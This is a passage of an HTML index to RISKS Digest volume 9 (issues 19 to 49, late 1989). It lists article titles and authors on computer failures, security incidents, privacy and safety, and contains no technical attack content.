<LI><A HREF="/Risks/9.19.html#subj2">  Reg. of Motor Vehicles computer slows down (Adam Gaffin)</A>
<LI><A HREF="/Risks/9.19.html#subj3">  British nuclear reactor software safety disputed (Jon Jacky)</A>
<LI><A HREF="/Risks/9.19.html#subj4">  South German hackers hack TV German Post (Klaus Brunnstein)</A>
<LI><A HREF="/Risks/9.19.html#subj5">  Ethics (Donald J. Weinshank via Tom Thomson)</A>
<LI><A HREF="/Risks/9.19.html#subj6">  sci.aeronautics, a new newsgroup (Robert Dorsett)</A>
<LI><A HREF="/Risks/9.19.html#subj7">  What's a stamp? (postal service problems) (David Elliott)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.20.html">Volume 9 Issue 20 (1 Sep 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.20.html#subj1">  Last Night's "Tonight" was Unknighted; Cars on Carson Top Hat Trick (PGN)</A>
<LI><A HREF="/Risks/9.20.html#subj2">  More on the Therac 25 -- by Jon Jacky (PGN)</A>
<LI><A HREF="/Risks/9.20.html#subj3">  Witness questions attack on Iranian jet (Robert Dorsett)</A>
<LI><A HREF="/Risks/9.20.html#subj4">  Risks of on-line course registration (Deborah M. Clawson)</A>
<LI><A HREF="/Risks/9.20.html#subj5">  Specifications (Martyn Thomas)</A>
<LI><A HREF="/Risks/9.20.html#subj6">  Re: Lowest-bidder or weak specs? (Scott, Robert Hirsch, Bill Cattey)</A>
<LI><A HREF="/Risks/9.20.html#subj7">  Pilot simulator training and boredom (Dan Franklin)</A>
<LI><A HREF="/Risks/9.20.html#subj8">  More on automation (Robert Dorsett)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.21.html">Volume 9 Issue 21 (5 Sep 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.21.html#subj1">  Re: Technology doesn't have to be bad (Brian Randell)</A>
<LI><A HREF="/Risks/9.21.html#subj2">  Medical systems and RF interference (Edward A. Ranzenbach)</A>
<LI><A HREF="/Risks/9.21.html#subj3">  `Business Week' on computers and privacy (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.21.html#subj4">  Law == Ethical Consensus (Scott Guthery)</A>
<LI><A HREF="/Risks/9.21.html#subj5">  US occupational hazards much worse than in Europe, report claims (Jon Jacky)</A>
<LI><A HREF="/Risks/9.21.html#subj6">  Are on-line pictures RISKy? (Russ Nelson)</A>
<LI><A HREF="/Risks/9.21.html#subj7">  Non-U.S. Postal Codes -or- Cheap Mail to Europe (Michael Franz)</A>
<LI><A HREF="/Risks/9.21.html#subj8">  Tired of computers being trusted? (Hugh Davies)</A>
<LI><A HREF="/Risks/9.21.html#subj9">  Re: lowest-bidder (Donald Lindsay, Bill Anderson)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.22.html">Volume 9 Issue 22 (6 Sep 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.22.html#subj1">  Paris computer takes law into its own hands (ST4012704 and Sally Jubb)</A>
<LI><A HREF="/Risks/9.22.html#subj2">  Brian Randell's comment on fault/failure analysis (Ted Lee)</A>
<LI><A HREF="/Risks/9.22.html#subj3">  Re: US occupational hazards much worse than in Europe (Mats Ohrman)</A>
<LI><A HREF="/Risks/9.22.html#subj4">  Re: medical systems and RF interference (Brian Kantor)</A>
<LI><A HREF="/Risks/9.22.html#subj5">  Re: mis-tagging (Olivier Crepin-Leblond)</A>
<LI><A HREF="/Risks/9.22.html#subj6">  Electronic House Arrest Failure (Martyn Thomas)</A>
<LI><A HREF="/Risks/9.22.html#subj7">  Re: Lowest-bidder or weak specs? (Henry Spencer)</A>
<LI><A HREF="/Risks/9.22.html#subj8">  Re: Law == Ethical Consensus (Douglas W. Jones, Victor Yodaiken,       Gilbert Harman, Eric Hughes, Bill Murray, Joel M. Halpern)
</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.23.html">Volume 9 Issue 23 (12 Sep 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.23.html#subj1">  Risks of RISKS: A bug in sendmail and multiple copies of <A HREF="/Risks/9.22.html">RISKS-9.22</A>     (PGN, with help from Bill Sommerfeld and Jeff Schiller)
</A>
<LI><A HREF="/Risks/9.23.html#subj2">  RF susceptibility of electronics (Pete Lucas)</A>
<LI><A HREF="/Risks/9.23.html#subj3">  Some background on the French Farce (Dave Horsfall)</A>
<LI><A HREF="/Risks/9.23.html#subj4">  Organizational Accreditation for Computer Assurance: Some Ideas    (Frank Houston)
</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.24.html">Volume 9 Issue 24 (14 Sep 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.24.html#subj1">  <A HREF="/Risks/9.22.html">RISKS-9.22</A> and <A HREF="/Risks/9.23.html">RISKS-9.23</A> problems had different causes! (PGN)</A>
<LI><A HREF="/Risks/9.24.html#subj2">  Risks of RISKS: A bug in sendmail and <A HREF="/Risks/9.22.html">RISKS-9.22</A> (Scott Mueller)</A>
<LI><A HREF="/Risks/9.24.html#subj3">  Phobos 1 &amp; 2 computer failures (Ralph Hartley)</A>
<LI><A HREF="/Risks/9.24.html#subj4">  Aircraft simulators (Rob Boudrie)</A>
<LI><A HREF="/Risks/9.24.html#subj5">  Speeders' Delight? (Anthony Stone)</A>
<LI><A HREF="/Risks/9.24.html#subj6">  Medical accreditation: based on "customer" clout? (Bob Ayers)</A>
<LI><A HREF="/Risks/9.24.html#subj7">  RISKS in mainstream entertainment (Mission Impossible) (Benjamin Ellsworth)</A>
<LI><A HREF="/Risks/9.24.html#subj8">  Software Safety Standards (Anthony J Zawilski)</A>
<LI><A HREF="/Risks/9.24.html#subj9">  12th National Computer Security Conference (Jack Holleran)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.25.html">Volume 9 Issue 25 (15 Sep 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.25.html#subj1">  Risks of distributed systems (Eugene Miya)</A>
<LI><A HREF="/Risks/9.25.html#subj2">  Medical accreditation: good for big shops only? (Douglas W. Jones)</A>
<LI><A HREF="/Risks/9.25.html#subj3">  The role of government regulation (Douglas W. Jones)</A>
<LI><A HREF="/Risks/9.25.html#subj4">  Is modern software design contributing to societal stupidity? (Tom Comeau)</A>
<LI><A HREF="/Risks/9.25.html#subj5">  Re: Aircraft simulators (Alan J Rosenthal, Robert Dorsett)</A>
<LI><A HREF="/Risks/9.25.html#subj6">  Mission: Impossible (Robert Dorsett)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.26.html">Volume 9 Issue 26 (20 Sep 1989 )</A>
<DD><UL>
<LI><A HREF="/Risks/9.26.html#subj1">  Hospital problems due to software bug (Joe Morris)</A>
<LI><A HREF="/Risks/9.26.html#subj2">  Man-Machine Failure at 1989 World Rowing Championships (Geoffrey Knauth)</A>
<LI><A HREF="/Risks/9.26.html#subj3">  Responsibility, Doctors, Military vs Software Developers (Leslie DeGroff)</A>
<LI><A HREF="/Risks/9.26.html#subj4">  Organizational Accreditation: More Thoughts (Frank Houston, Jon Jacky)</A>
<LI><A HREF="/Risks/9.26.html#subj5">  An interesting answer to the distributed time problem (Roy Smith)</A>
<LI><A HREF="/Risks/9.26.html#subj6">  Re: Risks of distributed systems (D. Pardo)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.27.html">Volume 9 Issue 27 (21 Sep 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.27.html#subj1">  Re: Brian Randell's commentary on safety analysis (Nancy Leveson)</A>
<LI><A HREF="/Risks/9.27.html#subj2">  Re: Risks of Distributed Systems (Charles Shub)</A>
<LI><A HREF="/Risks/9.27.html#subj3">  Re: Hospital problems due to software bug (Will Martin)</A>
<LI><A HREF="/Risks/9.27.html#subj4">  Mailer Bug moves to MCI? (Jerry Durand)</A>
<LI><A HREF="/Risks/9.27.html#subj5">  Loose wires, master clocks and satellites (Peter Jones, PGN)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.28.html">Volume 9 Issue 28 (24 Sep 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.28.html#subj1">  USAir 737-400 crash at LaGuardia (PGN)</A>
<LI><A HREF="/Risks/9.28.html#subj2">  Re: Hospital problems due to software bug (Steve VanDevender + Amos Shapir)</A>
<LI><A HREF="/Risks/9.28.html#subj3">  Computers, Planning, and Common Sense (John (J.G.) Mainwaring)</A>
<LI><A HREF="/Risks/9.28.html#subj4">  Synchronizing Clocks (Earl Boebert)</A>
<LI><A HREF="/Risks/9.28.html#subj5">  Re: Risks of Distributed Systems (Sung Kwon Chung)</A>
<LI><A HREF="/Risks/9.28.html#subj6">  Master clocks, etc. (Eddie Caplan)</A>
<LI><A HREF="/Risks/9.28.html#subj7">  ISO 9001 accreditation (Martyn Thomas)</A>
<LI><A HREF="/Risks/9.28.html#subj8">  Toxic Spill at the Department of Education [long] (Joe Pujals)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.29.html">Volume 9 Issue 29 (25 Sep 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.29.html#subj1">  Computerized fingerprint system has human failure (Dave Suess)</A>
<LI><A HREF="/Risks/9.29.html#subj2">  Computerized translation strikes again (Joe Morris)</A>
<LI><A HREF="/Risks/9.29.html#subj3">  Loose wires (Desmond Andigo via John Leonard)</A>
<LI><A HREF="/Risks/9.29.html#subj4">  Software *IS* an abstraction (Bob Estell)</A>
<LI><A HREF="/Risks/9.29.html#subj5">  Yes, the power grid IS getting less reliable (Bruce Hamilton)</A>
<LI><A HREF="/Risks/9.29.html#subj6">  Computers, Planning, and Common Sense (Richard O'Keefe)</A>
<LI><A HREF="/Risks/9.29.html#subj7">  Simulated aircraft emergencies (John Mackin)</A>
<LI><A HREF="/Risks/9.29.html#subj8">  Re: Software Accreditation (Richard Threadgill)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.30.html">Volume 9 Issue 30 (2 Oct 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.30.html#subj1">  The Cuckoo's Egg (Cliff Stoll)</A>
<LI><A HREF="/Risks/9.30.html#subj2">  Internet cracker on the loose (Barry Lustig) </A>
<LI><A HREF="/Risks/9.30.html#subj3">  Late night system administration == trouble on SunOS 4.x (Angela Marie Thomas)</A>
<LI><A HREF="/Risks/9.30.html#subj4">  Date manipulation and end of millennia (Pete Lucas)</A>
<LI><A HREF="/Risks/9.30.html#subj5">  Re: An interesting answer to the distributed time problem (Randall Davis)</A>
<LI><A HREF="/Risks/9.30.html#subj6">  Re: Man-Machine Failure at 1989 World Rowing Championships (Randall Davis)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.31.html">Volume 9 Issue 31 (4 Oct 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.31.html#subj1">  Computer multiplies taxable earnings by 100 (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.31.html#subj2">  Hackwatch spokesman charged (Dave Horsfall)</A>
<LI><A HREF="/Risks/9.31.html#subj3">  Re: Internet cracker on the loose (Randy Buckland)</A>
<LI><A HREF="/Risks/9.31.html#subj4">  Re: Hospital problems due to software bug (Mike Kimura)</A>
<LI><A HREF="/Risks/9.31.html#subj5">  Re: Date manipulation and end of millennia (Henry Spencer)</A>
<LI><A HREF="/Risks/9.31.html#subj6">  Re: Clock-watching (George L Sicherman)</A>
<LI><A HREF="/Risks/9.31.html#subj7">  9-digit precision (Gideon Yuvall)</A>
<LI><A HREF="/Risks/9.31.html#subj8">  The Risks of Crossing the Tracks (Railroad Crossing Gate Technology) (Jean-    David Beyer, Laurence Larry Sheldon, Richard L. Piazza via Chuck Weinstock)
</A>
<LI><A HREF="/Risks/9.31.html#subj9">  Fifth Annual Computer Security Applications Conference (Marshall D. Abrams)  </A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.32.html">Volume 9 Issue 32 (16 Oct 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.32.html#subj1">  Missed zero blamed for aircrash (Dave Horsfall)</A>
<LI><A HREF="/Risks/9.32.html#subj2">  Software reliance/software problems and the Stealth (Marc Rotenberg)</A>
<LI><A HREF="/Risks/9.32.html#subj3">  Coping with the unexpected - Friday's stock plunge (Steve Bellovin)</A>
<LI><A HREF="/Risks/9.32.html#subj4">  Re: latest stock market crash (Olivier Crepin-Leblond)</A>
<LI><A HREF="/Risks/9.32.html#subj5">  Atlantis launch delay (PGN)</A>
<LI><A HREF="/Risks/9.32.html#subj6">  Keeping up with the [Indian(a)] Joneses in elections (PGN)</A>
<LI><A HREF="/Risks/9.32.html#subj7">  Friendly advice... [Datacrime] (David Gursky)</A>
<LI><A HREF="/Risks/9.32.html#subj8">  Re: Synchronizing Clocks (Brian Randell)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.33.html">Volume 9 Issue 33 (22 Oct 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.33.html#subj1">  Earthquake preparedness in computing (PGN)</A>
<LI><A HREF="/Risks/9.33.html#subj2">  Air-Traffic Disruptions (PGN and Robert Dorsett)</A>
<LI><A HREF="/Risks/9.33.html#subj3">  Railroad Level-Crossing Monitoring (Brian Randell)</A>
<LI><A HREF="/Risks/9.33.html#subj4">  Sometimes touch-screens aren't user-friendly (Jeffrey Mogul)</A>
<LI><A HREF="/Risks/9.33.html#subj5">  UK Banking Error (Brian Randell)</A>
<LI><A HREF="/Risks/9.33.html#subj6">  Quotron gores the bears and bares the bulls (PGN)</A>
<LI><A HREF="/Risks/9.33.html#subj7">  Quotron software timing error (David B. Benson)</A>
<LI><A HREF="/Risks/9.33.html#subj8">  Re: latest stock market crash (David Gursky)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.34.html">Volume 9 Issue 34 (24 Oct 1989 )</A>
<DD><UL>
<LI><A HREF="/Risks/9.34.html#subj1">  Earthquake and Computers (Bill Murray)</A>
<LI><A HREF="/Risks/9.34.html#subj2">  Black Friday was only grey in Boston (Pete Kaiser)</A>
<LI><A HREF="/Risks/9.34.html#subj3">  Human chess supremacy at risk? (Bob Barger)</A>
<LI><A HREF="/Risks/9.34.html#subj4">  CERT Ultrix 3.0 Advisory (Ed DeHart)        </A>
<LI><A HREF="/Risks/9.34.html#subj5">  CERT DECnet Worm Advisory (Ed DeHart)       </A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.35.html">Volume 9 Issue 35 (25 Oct 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.35.html#subj1">  Offensive message on electronic information board (Bob Morris, John Crider)</A>
<LI><A HREF="/Risks/9.35.html#subj2">  14-year-old cracks TRW credit for major fraud (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.35.html#subj3">  Foreplay Doesn't Effect Response Time (Don Hopkins)</A>
<LI><A HREF="/Risks/9.35.html#subj4">  "Computer Virus Countermeasures" Article (Will Martin)</A>
<LI><A HREF="/Risks/9.35.html#subj5">  Hardware failure mimics hackers (Rob Wright)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.36.html">Volume 9 Issue 36 (27 Oct 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.36.html#subj1">  Bug in Intel 486 chip (PGN)</A>
<LI><A HREF="/Risks/9.36.html#subj2">  UK Banking Error (Brian Randell)</A>
<LI><A HREF="/Risks/9.36.html#subj3">  The Presentation of Risky Information (Joshua Levy)</A>
<LI><A HREF="/Risks/9.36.html#subj4">  Hardware failure mimics hackers (Pat White, Andy Goldstein)</A>
<LI><A HREF="/Risks/9.36.html#subj5">  Worms in a data stream (Rick Simkin)</A>
<LI><A HREF="/Risks/9.36.html#subj6">  CERT Advisory on Sun RCP (J. Paul Holbrook)</A>
<LI><A HREF="/Risks/9.36.html#subj7">  Warning About CERT Warnings (anonymous)</A>
<LI><A HREF="/Risks/9.36.html#subj8">  Licensed users exceeded (Tim Steele)</A>
<LI><A HREF="/Risks/9.36.html#subj9">  A lesson involving 'CRACKERS' (APPLE II) (Olivier Crepin-Leblond)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.37.html">Volume 9 Issue 37 (29 Oct 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.37.html#subj1">  Low-tech wins the day in airliner mishap (Glenn Story)</A>
<LI><A HREF="/Risks/9.37.html#subj2">  Hi-tech loses in cars (Alayne McGregor)</A>
<LI><A HREF="/Risks/9.37.html#subj3">  Re: Hardware failure mimics hackers (Sukumar Rathnam)</A>
<LI><A HREF="/Risks/9.37.html#subj4">  Re: Black Friday in Boston and manual systems (D. W. James)</A>
<LI><A HREF="/Risks/9.37.html#subj5">  Re: Human chess supremacy at risk? (Andrew Klossner)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.38.html">Volume 9 Issue 38 (31 Oct 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.38.html#subj1">  Passwords in the Electronic Home (Gary McClelland)</A>
<LI><A HREF="/Risks/9.38.html#subj2">  A new excuse (Ernest H. Robl)</A>
<LI><A HREF="/Risks/9.38.html#subj3">  Hot computers and temperature-sensitive programs (Donald Arseneau)</A>
<LI><A HREF="/Risks/9.38.html#subj4">  Re: Hi-tech loses in cars (Paul Fuqua)</A>
<LI><A HREF="/Risks/9.38.html#subj5">  Article on computer crime laws (Peter Ladkin)</A>
<LI><A HREF="/Risks/9.38.html#subj6">  Work processes which are done faster by hand than by machine (Alexis Rosen)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.39.html">Volume 9 Issue 39 (7 Nov 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.39.html#subj1">  Computer used to find scoflaws in Boston (Barry C. Nelson)</A>
<LI><A HREF="/Risks/9.39.html#subj2">  Air Traffic in Leesburg VA (PGN)</A>
<LI><A HREF="/Risks/9.39.html#subj3">  Equinox TV Documentary on "Fly By Wire" (Brian Randell)</A>
<LI><A HREF="/Risks/9.39.html#subj4">  Lifethreatening risk! (related to Soviet PCs) (Julian Thomas)</A>
<LI><A HREF="/Risks/9.39.html#subj5">  New computer risk: child abuse data base proposed (W. K. (Bill) Gorman)</A>
<LI><A HREF="/Risks/9.39.html#subj6">  Dangers of mail aliases (Jonathan Leech)</A>
<LI><A HREF="/Risks/9.39.html#subj7">  Committee report on Bugs (Bob Morris)</A>
<LI><A HREF="/Risks/9.39.html#subj8">  Computer Viruses Attack China (Yoshio Oyanagi)</A>
<LI><A HREF="/Risks/9.39.html#subj9">  First Virus Attack on Macs in Japan (Yoshio Oyanagi)</A>
<LI><A HREF="/Risks/9.39.html#subj10">  NTT Challenges Hackers (Mark H. W.)</A>
<LI><A HREF="/Risks/9.39.html#subj11">  Even COBOL programmers need to know about range checking. (Bryce Nesbitt)</A>
<LI><A HREF="/Risks/9.39.html#subj12">  Unix Expo Power Failure (Jan I Wolitzky)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.40.html">Volume 9 Issue 40 (10 Nov 1989 )</A>
<DD><UL>
<LI><A HREF="/Risks/9.40.html#subj1">  "Computer Error" in Durham N.C. election results     (J. Dean Brock, Ronnie W. Smith, John A. Board)
</A>
<LI><A HREF="/Risks/9.40.html#subj2">  Glitch in Virginia election totals (Paul Ammann)</A>
<LI><A HREF="/Risks/9.40.html#subj3">  Rome: Operator error causes publication of wrong election results    (Lorenzo Strigini)
</A>
<LI><A HREF="/Risks/9.40.html#subj4">  Delayed Stock Exchange Opening (Brian M. Clapper)</A>
<LI><A HREF="/Risks/9.40.html#subj5">  Electronic Warfare Systems not working--Congress ()</A>
<LI><A HREF="/Risks/9.40.html#subj6">  Computer used to find scoflaws in Boston (Peter Jones)</A>
<LI><A HREF="/Risks/9.40.html#subj7">  Computer errors and computer risks (Randall Davis)</A>
<LI><A HREF="/Risks/9.40.html#subj8">  Equinox program on Airbus (Lindsay F. Marshall)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.41.html">Volume 9 Issue 41 (11 Nov 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.41.html#subj1">  Stuffing the electronic ballot box (again) (PGN)</A>
<LI><A HREF="/Risks/9.41.html#subj2">  BART and the Bartered-Computer Commuters</A>
<LI><A HREF="/Risks/9.41.html#subj3">  Coral reef ruined by poor user interface design? (Jim Helman)</A>
<LI><A HREF="/Risks/9.41.html#subj4">  Re: Computer errors and computer risks (Jerome H Saltzer)</A>
<LI><A HREF="/Risks/9.41.html#subj5">  Computer used to find scoflaws in Boston (David desJardins)</A>
<LI><A HREF="/Risks/9.41.html#subj6">  Reference on the early history of Ada -- killing reliably (Eugene Miya)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.42.html">Volume 9 Issue 42 (13 Nov 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.42.html#subj1">  Equinox TV programme on A320 (Bev Littlewood, Chris Dalton)</A>
<LI><A HREF="/Risks/9.42.html#subj2">  European Safety is not always BETTER (Bruce C. Brown)</A>
<LI><A HREF="/Risks/9.42.html#subj3">  Artificial lightning (PGN)</A>
<LI><A HREF="/Risks/9.42.html#subj4">  Another intrusive database with associated privacy problems (Bill Gorman)</A>
<LI><A HREF="/Risks/9.42.html#subj5">  Re: "Computer Error" in Durham N.C. election results (Gregory G. Woodbury)</A>
<LI><A HREF="/Risks/9.42.html#subj6">  Re: Computer errors and computer risks (Willis H. Ware, D. King)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.43.html">Volume 9 Issue 43 (15 Nov 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.43.html#subj1">  L.A. Times Computer Foulup (Jerry Hollombe)</A>
<LI><A HREF="/Risks/9.43.html#subj2">  Altered bits in Risks 9.39 (John M. Sullivan and Henk Langeveld)</A>
<LI><A HREF="/Risks/9.43.html#subj3">  Re: Apollo 12 (Artificial lightning) (Henry Spencer)</A>
<LI><A HREF="/Risks/9.43.html#subj4">  Re: Equinox TV programme on A320 (Alan Marcum)</A>
<LI><A HREF="/Risks/9.43.html#subj5">  Failure of Systems After Earthquake (Jon von Zelowitz)</A>
<LI><A HREF="/Risks/9.43.html#subj6">  Article about "Paperless Office" (Alan Marcum)</A>
<LI><A HREF="/Risks/9.43.html#subj7">  Are you sure you declared ALL your dividends? (Peter Jones)</A>
<LI><A HREF="/Risks/9.43.html#subj8">  Re: Another intrusive database ... (Jim Horning)</A>
<LI><A HREF="/Risks/9.43.html#subj9">  Re: Computer errors and computer risks (David Smith, John Locke)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.44.html">Volume 9 Issue 44 (17 Nov 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.44.html#subj1">  More on BART's new computer system (PGN)</A>
<LI><A HREF="/Risks/9.44.html#subj2">  Computer misdirects phone calls for TV programme (Olivier Crepin-Leblond)</A>
<LI><A HREF="/Risks/9.44.html#subj3">  Murphy's Law Meets the Navy (PGN)</A>
<LI><A HREF="/Risks/9.44.html#subj4">  Unwanted Credit (Stuart Bell)</A>
<LI><A HREF="/Risks/9.44.html#subj5">  Saskatchewan shuts down translation project (Peter Jones)</A>
<LI><A HREF="/Risks/9.44.html#subj6">  Re: Another intrusive database with associated privacy problems    (Brinton Cooper)
</A>
<LI><A HREF="/Risks/9.44.html#subj7">  Re: Are you sure you declared ALL your dividends? (Jim Frost)</A>
<LI><A HREF="/Risks/9.44.html#subj8">  Re: L.A. Times "computer" problems [anonymous]</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.45.html">Volume 9 Issue 45 (20 Nov 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.45.html#subj1">  Another foretaste of the Millenium (Brian Randell)</A>
<LI><A HREF="/Risks/9.45.html#subj2">  UNIX EXPO Blackout (Brian Randell)</A>
<LI><A HREF="/Risks/9.45.html#subj3">  Autodialing horror stories (John )</A>
<LI><A HREF="/Risks/9.45.html#subj4">  Self-trust and computer professionals (Sean Eric Fagan)</A>
<LI><A HREF="/Risks/9.45.html#subj5">  Bit problem with <A HREF="/Risks/9.39.html">RISKS-9.39</A> was more global (Dan Johnson)</A>
<LI><A HREF="/Risks/9.45.html#subj6">  Gauge Proposed on Filing of Wage Data by Computer (David B. Benson)</A>
<LI><A HREF="/Risks/9.45.html#subj7">  Congress Finds Bugs in the Software (David B. Benson)</A>
<LI><A HREF="/Risks/9.45.html#subj8">  "Computer risks" (Randall Davis)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.46.html">Volume 9 Issue 46 (22 Nov 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.46.html#subj1">  ``Play it Again, Yonkers'' -- more election funnies (Steve Bellovin)</A>
<LI><A HREF="/Risks/9.46.html#subj2">  Army shuts down computers and goes home due to rain (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.46.html#subj3">  More good news -- Privacy and risks in credit information (Bill Gorman)</A>
<LI><A HREF="/Risks/9.46.html#subj4">  Automated Bank RISKS (John Howard Osborn)</A>
<LI><A HREF="/Risks/9.46.html#subj5">  Another Foretaste of the Millenium? (corrigenda) (Brian Randell)</A>
<LI><A HREF="/Risks/9.46.html#subj6">  Re: Self-trust and computer professionals (Jerry Hollombe)</A>
<LI><A HREF="/Risks/9.46.html#subj7">  Re: Congress Finds Bugs in the Software (Franklin Davis, Bob, David Gursky)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.47.html">Volume 9 Issue 47 (24 Nov 1989 )</A>
<DD><UL>
<LI><A HREF="/Risks/9.47.html#subj1">  Air Force Radar Risk (update) (Henry Cox)</A>
<LI><A HREF="/Risks/9.47.html#subj2">  Congressional report: "Bugs in the Program" (Gary Chapman, Dave Davis)</A>
<LI><A HREF="/Risks/9.47.html#subj3">  Re: Specifying vs. defining (Dave Platt)</A>
<LI><A HREF="/Risks/9.47.html#subj4">  Training programmers (Lee S. Ridgway)</A>
<LI><A HREF="/Risks/9.47.html#subj5">  Re: Privacy and risks in credit information (John DeBert)</A>
<LI><A HREF="/Risks/9.47.html#subj6">  Re: Automated Bank RISKS (Marc Shannon, Jon Mauney)</A>
<LI><A HREF="/Risks/9.47.html#subj7">  Re: Autodialing horror stories (Robert Sansom)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.48.html">Volume 9 Issue 48 (25 Nov 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.48.html#subj1">  Check inquiry / binary search (anonymous)</A>
<LI><A HREF="/Risks/9.48.html#subj2">  Re: Training programmers (Paul J. Mech)</A>
<LI><A HREF="/Risks/9.48.html#subj3">  Telephone Overload (Jon von Zelowitz)</A>
<LI><A HREF="/Risks/9.48.html#subj4">  Write protect tabs (via Peter Jones from Craig Finseth in VIRUS-L)</A>
<LI><A HREF="/Risks/9.48.html#subj5">  High error rates (P.E.Smee)</A>
<LI><A HREF="/Risks/9.48.html#subj6">  Policy vs. the Enabling Technology (Bill Murray)</A>
<LI><A HREF="/Risks/9.48.html#subj7">  Computer Virus Catalog Index: November' 89 (Klaus Brunnstein)</A>
<LI><A HREF="/Risks/9.48.html#subj8">  CERT_Tools_Announcement (Edward DeHart)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.49.html">Volume 9 Issue 49 (27 Nov 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.49.html#subj1">  Davis on arguing about technology vs policy (Phil Agre)</A>
<LI><A HREF="/Risks/9.49.html#subj2">  Re: Check inquiry / binary search: Gardner (Jim Griffith)</A>
<LI><A HREF="/Risks/9.49.html#subj3">  Re: Check inquiry / binary search: Theroux (Roy Smith)</A>
<LI><A HREF="/Risks/9.49.html#subj4">  Re: Privacy and risks in credit information (Brinton Cooper)</A>
<LI><A HREF="/Risks/9.49.html#subj5">  Re: UNIX EXPO Blackout" (Glenn Story)</A>
